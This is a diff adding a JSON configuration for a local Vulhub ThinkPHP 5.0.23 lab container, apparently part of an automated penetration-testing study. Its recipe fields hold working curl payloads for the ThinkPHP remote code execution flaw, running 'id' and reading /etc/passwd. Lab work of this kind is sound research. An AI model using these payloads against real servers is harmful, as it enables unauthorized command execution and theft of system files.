@@ -1,0 +1,23 @@
+{
+  "name": "Vulhub-ThinkPHP-5023-RCE",
+  "kind": "single-web-app-container",
+  "target": "http://127.0.0.1:8084",
+  "abstract_family": "rce_privesc",
+  "isolation_note": "Vulhub thinkphp/5.0.23-rce container, bound to 127.0.0.1:8084 only. Owned, disposable local lab. Confirm the bind is 127.0.0.1 before authorizing.",
+  "eta_fill": {
+    "login": "/index.php",
+    "wordlist": "/usr/share/wordlists/dirb/common.txt",
+    "webshell": "/index.php",
+    "file": "/etc/passwd"
+  },
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"{target}/\"",
+    "content_retrieval": "curl -s \"{target}/\"",
+    "vulnerability_check": "curl -s \"{target}/index.php?s=captcha\" -d \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\"",
+    "exploit_attempt": "curl -s \"{target}/index.php?s=captcha\" -d \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\"",
+    "command_execution": "curl -s \"{target}/index.php?s=captcha\" -d \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\"",
+    "sensitive_file_read": "curl -s \"{target}/index.php?s=captcha\" -d \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /etc/passwd\""
+  },
+  "recommended_first": false,
+  "rationale": "ThinkPHP 5.0.23 RCE — same self-advertising ThinkPHP framework as the 5-rce box but a distinct lab/CVE route. Reliable self-advertising data point for the multi-box study. Payload to be empirically confirmed on the live container (invokefunction route, %5C-encoded backslashes)."
+}
